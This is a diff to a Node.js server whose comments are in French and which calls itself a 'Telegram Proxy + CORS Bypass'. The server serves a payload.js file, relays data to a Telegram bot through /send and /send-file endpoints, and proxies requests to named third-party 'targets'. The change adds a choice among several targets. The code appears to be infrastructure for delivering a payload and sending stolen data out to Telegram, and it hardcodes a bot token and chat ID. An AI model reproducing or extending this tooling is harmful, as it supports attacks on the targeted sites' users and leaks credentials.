@@ -6,9 +6,16 @@ const path = require('path');
 // ==================== CONFIGURATION ====================
 const BOT_TOKEN = process.env.BOT_TOKEN || '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
 const CHAT_ID = process.env.CHAT_ID || '6767182328';
-const TARGET_API = process.env.TARGET_API || 'https://bugweb.lionelmelo.space';
+const DEFAULT_TARGET_API = process.env.TARGET_API || 'https://bugweb.lionelmelo.space';
 const DEBUG = process.env.DEBUG === 'true';
 const PORT = process.env.PORT || 3000;
+
+// Mapping des cibles (ajoute autant que tu veux)
+const TARGETS = {
+    bugweb: 'https://bugweb.lionelmelo.space',
+    bothub: 'https://bothub.togehost.online',
+    default: DEFAULT_TARGET_API
+};
 
 // Rate limiting
 const rateLimit = new Map();
@@ -82,9 +89,23 @@ app.get('/payload.js', (req, res) => {
     }
 });
 
-// ==================== PROXY VERS L'API CIBLE (contourne CORS) ====================
+// ==================== PROXY VERS L'API CIBLE (avec choix dynamique) ====================
 app.all('/api/*', rateLimitMiddleware, async (req, res) => {
-    const targetUrl = TARGET_API + req.url;
+    // Extraire le paramètre 'target' de l'URL (ex: /api/users?target=bothub)
+    const targetParam = req.query.target;
+    let targetApi = TARGETS.default;
+    
+    if (targetParam && TARGETS[targetParam]) {
+        targetApi = TARGETS[targetParam];
+        // Retirer le paramètre target de l'URL pour ne pas le passer à la cible
+        delete req.query.target;
+    }
+    
+    // Reconstruire l'URL sans le paramètre target
+    const queryString = Object.keys(req.query).length ? '?' + new URLSearchParams(req.query).toString() : '';
+    const cleanUrl = req.url.split('?')[0] + queryString;
+    const targetUrl = targetApi + cleanUrl;
+    
     const options = {
         method: req.method,
         headers: {
@@ -95,7 +116,7 @@ app.all('/api/*', rateLimitMiddleware, async (req, res) => {
         body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined
     };
     
-    log(`Proxy: ${req.method} ${targetUrl}`, 'INFO');
+    log(`Proxy: ${req.method} ${targetUrl} (target=${targetParam || 'default'})`, 'INFO');
     
     try {
         const controller = new AbortController();
@@ -111,11 +132,22 @@ app.all('/api/*', rateLimitMiddleware, async (req, res) => {
             data = { raw: await response.text() };
         }
         
+        // Ajouter un en-tête pour indiquer quelle cible a été utilisée
+        res.setHeader('X-Proxy-Target', targetParam || 'default');
         res.status(response.status).json(data);
     } catch (error) {
         log(`Proxy error: ${error.message}`, 'ERROR');
         res.status(500).json({ error: error.message });
     }
+});
+
+// Endpoint pour lister les cibles disponibles
+app.get('/api/targets', (req, res) => {
+    res.json({
+        targets: TARGETS,
+        current_default: TARGETS.default,
+        usage: 'Ajoutez ?target=bothub à vos requêtes pour changer de cible'
+    });
 });
 
 // ==================== TELEGRAM ENDPOINTS ====================
@@ -218,24 +250,26 @@ app.get('/health', (req, res) => {
         chat_configured: !!CHAT_ID,
         uptime: process.uptime(),
         memory: process.memoryUsage(),
-        version: '3.1.0'
+        version: '3.2.0'
     });
 });
 
 app.get('/info', (req, res) => {
     res.json({
-        name: 'Telegram Proxy + CORS Bypass + Static Server',
-        version: '3.1.0',
+        name: 'Telegram Proxy + CORS Bypass + Static Server + Multi-Target',
+        version: '3.2.0',
         endpoints: [
             'GET / - sert index.html',
             'GET /payload.js - sert payload.js',
-            'GET /health', 'GET /info',
+            'GET /health', 'GET /info', 'GET /api/targets',
             'POST /send', 'POST /send-file',
-            'GET|POST|PUT|DELETE /api/* (proxy vers cible)'
+            'GET|POST|PUT|DELETE /api/* (proxy vers cible)',
+            '   → Ajoutez ?target=bothub pour changer de cible'
         ],
         rate_limit: `${MAX_REQUESTS} requests per ${RATE_LIMIT_MS / 1000}s`,
         bot_configured: !!BOT_TOKEN,
-        target_api: TARGET_API
+        targets: TARGETS,
+        current_default: TARGETS.default
     });
 });
 
@@ -257,7 +291,12 @@ app.listen(PORT, () => {
     log(`📊 Health: http://localhost:${PORT}/health`, 'INFO');
     log(`📡 Send: POST http://localhost:${PORT}/send`, 'INFO');
     log(`📁 Send-file: POST http://localhost:${PORT}/send-file`, 'INFO');
-    log(`🔄 Proxy API: /api/* -> ${TARGET_API}`, 'INFO');
+    log(`🔄 Proxy API: /api/* -> cible configurable`, 'INFO');
+    log(`🎯 Cibles disponibles:`, 'INFO');
+    Object.entries(TARGETS).forEach(([key, url]) => {
+        log(`   - ${key}: ${url}`, 'INFO');
+    });
+    log(`💡 Utilisation: /api/endpoint?target=bothub`, 'INFO');
     log(`🛡️ Rate limit: ${MAX_REQUESTS}/minute`, 'INFO');
     log(`========================================`, 'INFO');
 });
